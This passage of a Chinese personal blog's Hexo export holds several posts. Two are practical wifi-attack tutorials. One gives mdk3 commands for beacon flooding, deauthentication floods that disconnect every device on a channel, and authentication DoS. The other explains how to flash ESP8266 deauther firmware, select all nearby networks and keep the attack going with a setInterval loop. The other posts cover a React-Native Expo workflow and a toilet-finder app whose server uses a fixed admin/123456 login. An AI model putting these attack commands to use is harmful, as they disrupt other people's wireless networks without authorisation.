href=\"https://y00z.github.io/2017/04/12/diary-2017-0412-01/\">(点我)</a>，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。</p>","more":"<p>固件地址<br><a href=\"https://github.com/spacehuhn/esp8266_deauther\" target=\"_blank\" rel=\"noopener\">https://github.com/spacehuhn/esp8266_deauther</a></p>\n<h3 id=\"干扰\"><a href=\"#干扰\" class=\"headerlink\" title=\"干扰\"></a>干扰</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。</p>\n<p>我们使用的是mdk3中的b模块(b-Beacon Flood Mode)</p>\n<pre><code>mdk3 wlan0 b -g -c 11\n</code></pre><ul>\n<li>-c 信道</li>\n<li><p>-g 54Mbit模式            <strong>↓</strong></p>\n<p><img src=\"/images/pasted-132.jpg\" alt></p>\n</li>\n</ul>\n<p>这种是创建数十个杂乱wifi信号来干扰。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-133.jpg\" alt></p>\n<p>下面我们可以来创建自定义wifi。</p>\n<p>首先把wifi名一行一个的保存在文本中。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-134.jpg\" alt></p>\n<p>我们先创建4个，当然也可以更多。</p>\n<pre><code>mdk3 wlan0 b -g -c 11 -f /root/ap.txt\n</code></pre><ul>\n<li><p>-f 自定义wifi名        <strong>↓</strong></p>\n<p><img src=\"/images/pasted-136.jpg\" alt></p>\n</li>\n</ul>\n<p>然后会创建出以我们保存在文本中的名字的wifi名。<strong>↓</strong></p>\n<p> <img src=\"/images/pasted-135.jpg\" alt></p>\n<h3 id=\"题外\"><a href=\"#题外\" class=\"headerlink\" title=\"题外\"></a>题外</h3><p>下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用<a href=\"https://y00z.github.io/2017/04/12/diary-2017-0412-01/\">(点我)</a></p>\n<h4 id=\"洪水攻击\"><a href=\"#洪水攻击\" class=\"headerlink\" title=\"洪水攻击\"></a>洪水攻击</h4><p>mdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack)</p>\n<pre><code>mdk3 wlan0 d -c 11\n</code></pre><p>所有连接了频道为11的ap设备全部断线。</p>\n<p>同时也有个设置白名单</p>\n<pre><code>mdk3 mon0 d -c 11 -w &quot;whitelist.txt&quot;\n</code></pre><ul>\n<li>-w 白名单</li>\n<li>-b 黑名单</li>\n</ul>\n<p>除了保存在白名单中的设备，其他全部断线。</p>\n<h4 id=\"身份验证攻击\"><a href=\"#身份验证攻击\" class=\"headerlink\" title=\"身份验证攻击\"></a>身份验证攻击</h4><p>还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode)</p>\n<pre><code>mdk3 wlan0 a -a wifi_MAC\n</code></pre><ul>\n<li>-a wifi的mac地址</li>\n</ul>"},{"layout":"post","title":"React-Native新颖的开发模式","date":"2017-07-19T07:07:49.000Z","comments":1,"_content":"\n#### 前言\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个React-Native非常新颖的模式，类似于微信小程序，通过扫描二维码来打开app，避免了烦琐的安卓和ios打包环境。\n\n#### 正文\n\n需要两个工具\n\n * create-react-native-app\n * Expo\n\n第一个工具直接通过npm安装即可\n\t`npm install -g create-react-native-app`\n<!--more-->\n第二个工具是一个手机app，官网下载即可\n\t`https://expo.io/`\n\n首先通过`create-react-native YoozApp`来初始化一个项目\n\n![](/images/pasted-137.jpg)\n\n可以看到没有ios和安卓的入口文件和工程目录，只有js文件。\nApp.js就是项目的入口文件。\n\n接下来cd进入到项目目录中来，运行命令`npm start`，就会生成二维码，通过第二个工具我们在手机上装的expo扫描这个二维码就能直接打开我们的react-native应用了，类似小程序。\n\n![](/images/pasted-138.jpg)\n\n这个React-Native开发模式避免了烦琐的编译步骤，不管电脑是 windows 还是mac ，也不用管手机是苹果还是安卓，都可以进行所有平台的代码编写和真机测试。\n\n<font color=\"#ff0000\">**注意**</font>\n\n但是这种方式限制了打开方式，也就是只能在Expo中打开。所以如果要打包app到应用市场的话，那么这个开发模式并不适用。\n\n不过我们可以用这个来学习React-Native开发，也可以使用这个完成app开发后，要打包的话，可以直接把代码copy到打包的项目中。\n\n\n#### 示例\n\n\n\n安装好第二个工具，官网`https://expo.io/`\n\napp页面\n\n![](/images/pasted-140.png)\n\n扫描过的二维码记录都会保存在页面中\n\n安装完成后打开app，扫描二维码，下面这个二维码是react-navigation的demo\n\n![](/images/pasted-139.jpg)\n\n扫描后即可直接打开React-Native应用，无需安装。\n\n","source":"_posts/diary-2017-0719-01.md","raw":"---\nlayout: post\ntitle: React-Native新颖的开发模式\ndate: 2017-07-19 15:07:49\ncomments: true\ntags:\n\t- React-Native\n---\n\n#### 前言\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个React-Native非常新颖的模式，类似于微信小程序，通过扫描二维码来打开app，避免了烦琐的安卓和ios打包环境。\n\n#### 正文\n\n需要两个工具\n\n * create-react-native-app\n * Expo\n\n第一个工具直接通过npm安装即可\n\t`npm install -g create-react-native-app`\n<!--more-->\n第二个工具是一个手机app，官网下载即可\n\t`https://expo.io/`\n\n首先通过`create-react-native YoozApp`来初始化一个项目\n\n![](/images/pasted-137.jpg)\n\n可以看到没有ios和安卓的入口文件和工程目录，只有js文件。\nApp.js就是项目的入口文件。\n\n接下来cd进入到项目目录中来，运行命令`npm start`，就会生成二维码，通过第二个工具我们在手机上装的expo扫描这个二维码就能直接打开我们的react-native应用了，类似小程序。\n\n![](/images/pasted-138.jpg)\n\n这个React-Native开发模式避免了烦琐的编译步骤，不管电脑是 windows 还是mac ，也不用管手机是苹果还是安卓，都可以进行所有平台的代码编写和真机测试。\n\n<font color=\"#ff0000\">**注意**</font>\n\n但是这种方式限制了打开方式，也就是只能在Expo中打开。所以如果要打包app到应用市场的话，那么这个开发模式并不适用。\n\n不过我们可以用这个来学习React-Native开发，也可以使用这个完成app开发后，要打包的话，可以直接把代码copy到打包的项目中。\n\n\n#### 示例\n\n\n\n安装好第二个工具，官网`https://expo.io/`\n\napp页面\n\n![](/images/pasted-140.png)\n\n扫描过的二维码记录都会保存在页面中\n\n安装完成后打开app，扫描二维码，下面这个二维码是react-navigation的demo\n\n![](/images/pasted-139.jpg)\n\n扫描后即可直接打开React-Native应用，无需安装。\n\n","slug":"diary-2017-0719-01","published":1,"updated":"2017-07-26T13:42:00.662Z","photos":[],"link":"","_id":"cjvhjxab1000uiny2me1ozvxz","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个React-Native非常新颖的模式，类似于微信小程序，通过扫描二维码来打开app，避免了烦琐的安卓和ios打包环境。</p>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><p>需要两个工具</p>\n<ul>\n<li>create-react-native-app</li>\n<li>Expo</li>\n</ul>\n<p>第一个工具直接通过npm安装即可<br>    <code>npm install -g create-react-native-app</code><br><a id=\"more\"></a><br>第二个工具是一个手机app，官网下载即可<br>    <code>https://expo.io/</code></p>\n<p>首先通过<code>create-react-native YoozApp</code>来初始化一个项目</p>\n<p><img src=\"/images/pasted-137.jpg\" alt></p>\n<p>可以看到没有ios和安卓的入口文件和工程目录，只有js文件。<br>App.js就是项目的入口文件。</p>\n<p>接下来cd进入到项目目录中来，运行命令<code>npm start</code>，就会生成二维码，通过第二个工具我们在手机上装的expo扫描这个二维码就能直接打开我们的react-native应用了，类似小程序。</p>\n<p><img src=\"/images/pasted-138.jpg\" alt></p>\n<p>这个React-Native开发模式避免了烦琐的编译步骤，不管电脑是 windows 还是mac ，也不用管手机是苹果还是安卓，都可以进行所有平台的代码编写和真机测试。</p>\n<font color=\"#ff0000\"><strong>注意</strong></font>\n\n<p>但是这种方式限制了打开方式，也就是只能在Expo中打开。所以如果要打包app到应用市场的话，那么这个开发模式并不适用。</p>\n<p>不过我们可以用这个来学习React-Native开发，也可以使用这个完成app开发后，要打包的话，可以直接把代码copy到打包的项目中。</p>\n<h4 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h4><p>安装好第二个工具，官网<code>https://expo.io/</code></p>\n<p>app页面</p>\n<p><img src=\"/images/pasted-140.png\" alt></p>\n<p>扫描过的二维码记录都会保存在页面中</p>\n<p>安装完成后打开app，扫描二维码，下面这个二维码是react-navigation的demo</p>\n<p><img src=\"/images/pasted-139.jpg\" alt></p>\n<p>扫描后即可直接打开React-Native应用，无需安装。</p>\n","site":{"data":{}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个React-Native非常新颖的模式，类似于微信小程序，通过扫描二维码来打开app，避免了烦琐的安卓和ios打包环境。</p>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><p>需要两个工具</p>\n<ul>\n<li>create-react-native-app</li>\n<li>Expo</li>\n</ul>\n<p>第一个工具直接通过npm安装即可<br>    <code>npm install -g create-react-native-app</code><br>","more":"<br>第二个工具是一个手机app，官网下载即可<br>    <code>https://expo.io/</code></p>\n<p>首先通过<code>create-react-native YoozApp</code>来初始化一个项目</p>\n<p><img src=\"/images/pasted-137.jpg\" alt></p>\n<p>可以看到没有ios和安卓的入口文件和工程目录，只有js文件。<br>App.js就是项目的入口文件。</p>\n<p>接下来cd进入到项目目录中来，运行命令<code>npm start</code>，就会生成二维码，通过第二个工具我们在手机上装的expo扫描这个二维码就能直接打开我们的react-native应用了，类似小程序。</p>\n<p><img src=\"/images/pasted-138.jpg\" alt></p>\n<p>这个React-Native开发模式避免了烦琐的编译步骤，不管电脑是 windows 还是mac ，也不用管手机是苹果还是安卓，都可以进行所有平台的代码编写和真机测试。</p>\n<font color=\"#ff0000\"><strong>注意</strong></font>\n\n<p>但是这种方式限制了打开方式，也就是只能在Expo中打开。所以如果要打包app到应用市场的话，那么这个开发模式并不适用。</p>\n<p>不过我们可以用这个来学习React-Native开发，也可以使用这个完成app开发后，要打包的话，可以直接把代码copy到打包的项目中。</p>\n<h4 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h4><p>安装好第二个工具，官网<code>https://expo.io/</code></p>\n<p>app页面</p>\n<p><img src=\"/images/pasted-140.png\" alt></p>\n<p>扫描过的二维码记录都会保存在页面中</p>\n<p>安装完成后打开app，扫描二维码，下面这个二维码是react-navigation的demo</p>\n<p><img src=\"/images/pasted-139.jpg\" alt></p>\n<p>扫描后即可直接打开React-Native应用，无需安装。</p>"},{"title":"ESP8266攻击wifi","date":"2018-06-09T10:21:28.000Z","layout":"post","comments":1,"_content":"\n\n#### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没有写过博客了，自从来到这边后就几乎没有了自己的空余时间。这个ESP8266也是从白忙中挤出时间来弄的。\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于ESP8266我也在之前的文章中也提到过，[(点我)](https://y00z.github.io/2017/06/08/diary-2017-0628-01/)，使用这个需要ESP8266芯片中烧录bin文件，芯片在淘宝中可购到。\n\n\n\n#### 正文\n\n* 需要的设备\n\t* ESP8266芯片\n\t* nodemcu烧录程序\n\t* bin固件\n\n<!--more-->\n\n![](/images/Screenshot_20170214-13584229.jpg)\n\n芯片中有两个按钮，一个reset，一个flash\n\n芯片准备好后，需要一条microUSB线和电脑连接，连接后会自动安装驱动程序。（实测中win10会自动安装，win7需要自行安装，连接电脑后可下载驱动精灵或者驱动大师检测一下）\n\n打开烧录程序，config选项，选择bin固件\n\n![](/images/pasted-141.png)\n\n再选择bin固件的信息，我们的固件不到1m就选择1m的。\n\n![](/images/pasted-142.png)\n\n最后选择串口，然后开始烧录\n\n![](/images/pasted-143.png)\n\n烧录结束后，按下芯片的reset按钮，重启一下。\n\n之后搜索wifi，如果有搜索pwned的wifi名，就说明烧录成功了。默认密码为：`deauther`\n\n连接wifi后打开浏览器进入`192.168.4.1`\n\n进入控制台\n\n![](/images/pasted-144.png)\n\n下一步，然后直接SCAN APS扫描所有的wifi。\n\n![](/images/pasted-145.png)\n\n扫描到wifi后，SELECT ALL选择所有的\n\n![](/images/pasted-146.png)\n\n然后切换到ATTACKS标签，可以看到Targets中有我们选择的wifi数量\n\n![](/images/pasted-147.png)\n\n然后直接start，这个时候查看wifi，会发现选择的wifi已经全部连接不上，\n\n由于我们使用的是小芯片，禁不起长时间的攻击，时间长后就会芯片发热自动停止。所有我们可以自己在浏览器中写一个定时任务。\n\n    setInterval(function(){start(0)},10000)\n\n攻击10秒钟，然后暂停10秒钟，不停循环，可以不停攻击同时可以防止芯片过热。\n\n\n#### 下载\n\n* nodemcu烧录程序\n\t* [https://github.com/nodemcu/nodemcu-flasher](https://github.com/nodemcu/nodemcu-flasher)\n* bin固件\n\t* [https://github.com/spacehuhn/esp8266_deauther](https://github.com/spacehuhn/esp8266_deauther)","source":"_posts/diary-2018-0609-01.md","raw":"---\ntitle: ESP8266攻击wifi\ndate: 2018-06-09 18:21:28\nlayout: post\ncomments: true\ntags:\n\t- 安全攻防\n\t- wifi\n---\n\n\n#### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没有写过博客了，自从来到这边后就几乎没有了自己的空余时间。这个ESP8266也是从白忙中挤出时间来弄的。\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于ESP8266我也在之前的文章中也提到过，[(点我)](https://y00z.github.io/2017/06/08/diary-2017-0628-01/)，使用这个需要ESP8266芯片中烧录bin文件，芯片在淘宝中可购到。\n\n\n\n#### 正文\n\n* 需要的设备\n\t* ESP8266芯片\n\t* nodemcu烧录程序\n\t* bin固件\n\n<!--more-->\n\n![](/images/Screenshot_20170214-13584229.jpg)\n\n芯片中有两个按钮，一个reset，一个flash\n\n芯片准备好后，需要一条microUSB线和电脑连接，连接后会自动安装驱动程序。（实测中win10会自动安装，win7需要自行安装，连接电脑后可下载驱动精灵或者驱动大师检测一下）\n\n打开烧录程序，config选项，选择bin固件\n\n![](/images/pasted-141.png)\n\n再选择bin固件的信息，我们的固件不到1m就选择1m的。\n\n![](/images/pasted-142.png)\n\n最后选择串口，然后开始烧录\n\n![](/images/pasted-143.png)\n\n烧录结束后，按下芯片的reset按钮，重启一下。\n\n之后搜索wifi，如果有搜索pwned的wifi名，就说明烧录成功了。默认密码为：`deauther`\n\n连接wifi后打开浏览器进入`192.168.4.1`\n\n进入控制台\n\n![](/images/pasted-144.png)\n\n下一步，然后直接SCAN APS扫描所有的wifi。\n\n![](/images/pasted-145.png)\n\n扫描到wifi后，SELECT ALL选择所有的\n\n![](/images/pasted-146.png)\n\n然后切换到ATTACKS标签，可以看到Targets中有我们选择的wifi数量\n\n![](/images/pasted-147.png)\n\n然后直接start，这个时候查看wifi，会发现选择的wifi已经全部连接不上，\n\n由于我们使用的是小芯片，禁不起长时间的攻击，时间长后就会芯片发热自动停止。所有我们可以自己在浏览器中写一个定时任务。\n\n    setInterval(function(){start(0)},10000)\n\n攻击10秒钟，然后暂停10秒钟，不停循环，可以不停攻击同时可以防止芯片过热。\n\n\n#### 下载\n\n* nodemcu烧录程序\n\t* [https://github.com/nodemcu/nodemcu-flasher](https://github.com/nodemcu/nodemcu-flasher)\n* bin固件\n\t* [https://github.com/spacehuhn/esp8266_deauther](https://github.com/spacehuhn/esp8266_deauther)","slug":"diary-2018-0609-01","published":1,"updated":"2018-06-11T15:34:39.488Z","photos":[],"link":"","_id":"cjvhjxab1000viny2hqeu32uu","content":"<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没有写过博客了，自从来到这边后就几乎没有了自己的空余时间。这个ESP8266也是从白忙中挤出时间来弄的。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于ESP8266我也在之前的文章中也提到过，<a href=\"https://y00z.github.io/2017/06/08/diary-2017-0628-01/\">(点我)</a>，使用这个需要ESP8266芯片中烧录bin文件，芯片在淘宝中可购到。</p>\n</blockquote>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><ul>\n<li>需要的设备<ul>\n<li>ESP8266芯片</li>\n<li>nodemcu烧录程序</li>\n<li>bin固件</li>\n</ul>\n</li>\n</ul>\n<a id=\"more\"></a>\n<p><img src=\"/images/Screenshot_20170214-13584229.jpg\" alt></p>\n<p>芯片中有两个按钮，一个reset，一个flash</p>\n<p>芯片准备好后，需要一条microUSB线和电脑连接，连接后会自动安装驱动程序。（实测中win10会自动安装，win7需要自行安装，连接电脑后可下载驱动精灵或者驱动大师检测一下）</p>\n<p>打开烧录程序，config选项，选择bin固件</p>\n<p><img src=\"/images/pasted-141.png\" alt></p>\n<p>再选择bin固件的信息，我们的固件不到1m就选择1m的。</p>\n<p><img src=\"/images/pasted-142.png\" alt></p>\n<p>最后选择串口，然后开始烧录</p>\n<p><img src=\"/images/pasted-143.png\" alt></p>\n<p>烧录结束后，按下芯片的reset按钮，重启一下。</p>\n<p>之后搜索wifi，如果有搜索pwned的wifi名，就说明烧录成功了。默认密码为：<code>deauther</code></p>\n<p>连接wifi后打开浏览器进入<code>192.168.4.1</code></p>\n<p>进入控制台</p>\n<p><img src=\"/images/pasted-144.png\" alt></p>\n<p>下一步，然后直接SCAN APS扫描所有的wifi。</p>\n<p><img src=\"/images/pasted-145.png\" alt></p>\n<p>扫描到wifi后，SELECT ALL选择所有的</p>\n<p><img src=\"/images/pasted-146.png\" alt></p>\n<p>然后切换到ATTACKS标签，可以看到Targets中有我们选择的wifi数量</p>\n<p><img src=\"/images/pasted-147.png\" alt></p>\n<p>然后直接start，这个时候查看wifi，会发现选择的wifi已经全部连接不上，</p>\n<p>由于我们使用的是小芯片，禁不起长时间的攻击，时间长后就会芯片发热自动停止。所有我们可以自己在浏览器中写一个定时任务。</p>\n<pre><code>setInterval(function(){start(0)},10000)\n</code></pre><p>攻击10秒钟，然后暂停10秒钟，不停循环，可以不停攻击同时可以防止芯片过热。</p>\n<h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><ul>\n<li>nodemcu烧录程序<ul>\n<li><a href=\"https://github.com/nodemcu/nodemcu-flasher\" target=\"_blank\" rel=\"noopener\">https://github.com/nodemcu/nodemcu-flasher</a></li>\n</ul>\n</li>\n<li>bin固件<ul>\n<li><a href=\"https://github.com/spacehuhn/esp8266_deauther\" target=\"_blank\" rel=\"noopener\">https://github.com/spacehuhn/esp8266_deauther</a></li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没有写过博客了，自从来到这边后就几乎没有了自己的空余时间。这个ESP8266也是从白忙中挤出时间来弄的。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于ESP8266我也在之前的文章中也提到过，<a href=\"https://y00z.github.io/2017/06/08/diary-2017-0628-01/\">(点我)</a>，使用这个需要ESP8266芯片中烧录bin文件，芯片在淘宝中可购到。</p>\n</blockquote>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><ul>\n<li>需要的设备<ul>\n<li>ESP8266芯片</li>\n<li>nodemcu烧录程序</li>\n<li>bin固件</li>\n</ul>\n</li>\n</ul>","more":"<p><img src=\"/images/Screenshot_20170214-13584229.jpg\" alt></p>\n<p>芯片中有两个按钮，一个reset，一个flash</p>\n<p>芯片准备好后，需要一条microUSB线和电脑连接，连接后会自动安装驱动程序。（实测中win10会自动安装，win7需要自行安装，连接电脑后可下载驱动精灵或者驱动大师检测一下）</p>\n<p>打开烧录程序，config选项，选择bin固件</p>\n<p><img src=\"/images/pasted-141.png\" alt></p>\n<p>再选择bin固件的信息，我们的固件不到1m就选择1m的。</p>\n<p><img src=\"/images/pasted-142.png\" alt></p>\n<p>最后选择串口，然后开始烧录</p>\n<p><img src=\"/images/pasted-143.png\" alt></p>\n<p>烧录结束后，按下芯片的reset按钮，重启一下。</p>\n<p>之后搜索wifi，如果有搜索pwned的wifi名，就说明烧录成功了。默认密码为：<code>deauther</code></p>\n<p>连接wifi后打开浏览器进入<code>192.168.4.1</code></p>\n<p>进入控制台</p>\n<p><img src=\"/images/pasted-144.png\" alt></p>\n<p>下一步，然后直接SCAN APS扫描所有的wifi。</p>\n<p><img src=\"/images/pasted-145.png\" alt></p>\n<p>扫描到wifi后，SELECT ALL选择所有的</p>\n<p><img src=\"/images/pasted-146.png\" alt></p>\n<p>然后切换到ATTACKS标签，可以看到Targets中有我们选择的wifi数量</p>\n<p><img src=\"/images/pasted-147.png\" alt></p>\n<p>然后直接start，这个时候查看wifi，会发现选择的wifi已经全部连接不上，</p>\n<p>由于我们使用的是小芯片，禁不起长时间的攻击，时间长后就会芯片发热自动停止。所有我们可以自己在浏览器中写一个定时任务。</p>\n<pre><code>setInterval(function(){start(0)},10000)\n</code></pre><p>攻击10秒钟，然后暂停10秒钟，不停循环，可以不停攻击同时可以防止芯片过热。</p>\n<h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><ul>\n<li>nodemcu烧录程序<ul>\n<li><a href=\"https://github.com/nodemcu/nodemcu-flasher\" target=\"_blank\" rel=\"noopener\">https://github.com/nodemcu/nodemcu-flasher</a></li>\n</ul>\n</li>\n<li>bin固件<ul>\n<li><a href=\"https://github.com/spacehuhn/esp8266_deauther\" target=\"_blank\" rel=\"noopener\">https://github.com/spacehuhn/esp8266_deauther</a></li>\n</ul>\n</li>\n</ul>"},{"title":"React-Native找厕所项目+Nodejs服务端","date":"2017-07-26T05:21:43.000Z","layout":"post","comments":1,"_content":"\n\n#### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;个人的一个React-Native项目，前几天买了一台ipad的,正好同时适配了ios/android两个平台并且进行了优化。\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过调用高德地图LBS定位并且寻找附近的厕所自动导航，同时支持阅读新闻，定位获取城区天气等，使用官方推荐的react-navigation和最新的FlatList组件，并且使用的是reate-react-native-app模式开发的app，这个模式在上一篇文章有介绍[(点我)](https://y00z.github.io/2017/07/19/diary-2017-0719-01/)，代码及其紧凑扩展性强(官推的导航组件太好用了)，同时感谢vczero大哥提供的学习资料素材。\n\n#### 正文\n* 服务器\n\t* NodeJs\n\t* express4\n\t* mongodb\n\n<!--more-->\n服务器同时用了session持久化，把用户登录状态保存起来，帐号密码并没有植入到数据库中，而是固定的帐号admin，密码123456\n目前只是用户录入的新闻数据是存储在数据库中的，因为服务器并不是项目中的主要。\n之前也有发过Nodejs电影站的开源项目，里面所有数据是全部都存入到数据库中的[(点我)](https://y00z.github.io/2016/12/20/diary-2016-1220-01/)\n\n* app客户端\n\t* FlatList\n\t* react-navigation\n\t* 高德地图api\n\n同时适配了ios/android两个平台并且进行了优化，使用的reate-react-native-app模式开发,该模式详情[(点我)](https://y00z.github.io/2017/07/19/diary-2017-0719-01/)\n\n* 运行\n\t* 服务端运行\n\t\t* npm install\n\t\t* mongod --dbpath D:\\db \n\t\t* node app\n\t* 客户端运行\n\t\t* npm install\n\t\t* npm start\n\n#### 效果图\n>   * android\n\n![](/images/2017-07-26-01-android.gif)\n\n\n>   * ios\n\n![](/images/2017-07-26-01-ios.gif) \n\n\n#### 项目源码地址\n* 服务端\n\t* [https://github.com/Y00z/react-navie_toilet_server](https://github.com/Y00z/react-navie_toilet_server)\n* app客户端\n\t* [https://github.com/Y00z/react-navie_toilet](https://github.com/Y00z/react-navie_toilet)","source":"_posts/diary-2017-0726-01.md","raw":"---\ntitle: React-Native找厕所项目+Nodejs服务端\ndate: 2017-07-26 13:21:43\nlayout: post\ncomments: true\ntags:\n\t- React-Native\n\t- NodeJs\n\t- 开源\n---\n\n\n#### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;个人的一个React-Native项目，前几天买了一台ipad的,正好同时适配了ios/android两个平台并且进行了优化。\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过调用高德地图LBS定位并且寻找附近的厕所自动导航，同时支持阅读新闻，定位获取城区天气等，使用官方推荐的react-navigation和最新的FlatList组件，并且使用的是reate-react-native-app模式开发的app，这个模式在上一篇文章有介绍[(点我)](https://y00z.github.io/2017/07/19/diary-2017-0719-01/)，代码及其紧凑扩展性强(官推的导航组件太好用了)，同时感谢vczero大哥提供的学习资料素材。\n\n#### 正文\n* 服务器\n\t* NodeJs\n\t* express4\n\t* mongodb\n\n<!--more-->\n服务器同时用了session持久化，把用户登录状态保存起来，帐号密码并没有植入到数据库中，而是固定的帐号admin，密码123456\n目前只是用户录入的新闻数据是存储在数据库中的，因为服务器并不是项目中的主要。\n之前也有发过Nodejs电影站的开源项目，里面所有数据是全部都存入到数据库中的[(点我)](https://y00z.github.io/2016/12/20/diary-2016-1220-01/)\n\n* app客户端\n\t* FlatList\n\t* react-navigation\n\t* 高德地图api\n\n同时适配了ios/android两个平台并且进行了优化，使用的reate-react-native-app模式开发,该模式详情[(点我)](https://y00z.github.io/2017/07/19/diary-2017-0719-01/)\n\n* 运行\n\t* 服务端运行\n\t\t* npm install\n\t\t* mongod --dbpath D:\\db \n\t\t* node app\n\t* 客户端运行\n\t\t* npm install\n\t\t* npm start\n\n#### 效果图\n>   * android\n\n![](/images/2017-07-26-01-android.gif)\n\n\n>   * ios\n\n![](/images/2017-07-26-01-ios.gif) \n\n\n#### 项目源码地址\n* 服务端\n\t* [https://github.com/Y00z/react-navie_toilet_server](https://github.com/Y00z/react-navie_toilet_server)\n* app客户端\n\t* [https://github.com/Y00z/react-navie_toilet](https://github.com/Y00z/react-navie_toilet)","slug":"diary-2017-0726-01","published":1,"updated":"2017-07-26T13:08:42.781Z","photos":[],"link":"","_id":"cjvhjxab2000winy20ikrfsct","content":"<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;个人的一个React-Native项目，前几天买了一台ipad的,正好同时适配了ios/android两个平台并且进行了优化。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过调用高德地图LBS定位并且寻找附近的厕所自动导航，同时支持阅读新闻，定位获取城区天气等，使用官方推荐的react-navigation和最新的FlatList组件，并且使用的是reate-react-native-app模式开发的app，这个模式在上一篇文章有介绍<a href=\"https://y00z.github.io/2017/07/19/diary-2017-0719-01/\">(点我)</a>，代码及其紧凑扩展性强(官推的导航组件太好用了)，同时感谢vczero大哥提供的学习资料素材。</p>\n</blockquote>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><ul>\n<li>服务器<ul>\n<li>NodeJs</li>\n<li>express4</li>\n<li>mongodb</li>\n</ul>\n</li>\n</ul>\n<a id=\"more\"></a>\n<p>服务器同时用了session持久化，把用户登录状态保存起来，帐号密码并没有植入到数据库中，而是固定的帐号admin，密码123456<br>目前只是用户录入的新闻数据是存储在数据库中的，因为服务器并不是项目中的主要。<br>之前也有发过Nodejs电影站的开源项目，里面所有数据是全部都存入到数据库中的<a href=\"https://y00z.github.io/2016/12/20/diary-2016-1220-01/\">(点我)</a></p>\n<ul>\n<li>app客户端<ul>\n<li>FlatList</li>\n<li>react-navigation</li>\n<li>高德地图api</li>\n</ul>\n</li>\n</ul>\n<p>同时适配了ios/android两个平台并且进行了优化，使用的reate-react-native-app模式开发,该模式详情<a href=\"https://y00z.github.io/2017/07/19/diary-2017-0719-01/\">(点我)</a></p>\n<ul>\n<li>运行<ul>\n<li>服务端运行<ul>\n<li>npm install</li>\n<li>mongod –dbpath D:\\db </li>\n<li>node app</li>\n</ul>\n</li>\n<li>客户端运行<ul>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><blockquote>\n<ul>\n<li>android</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/2017-07-26-01-android.gif\" alt></p>\n<blockquote>\n<ul>\n<li>ios</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/2017-07-26-01-ios.gif\" alt> </p>\n<h4 id=\"项目源码地址\"><a href=\"#项目源码地址\" class=\"headerlink\" title=\"项目源码地址\"></a>项目源码地址</h4><ul>\n<li>服务端<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_toilet_server\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_toilet_server</a></li>\n</ul>\n</li>\n<li>app客户端<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_toilet\" target=\"_blank\" 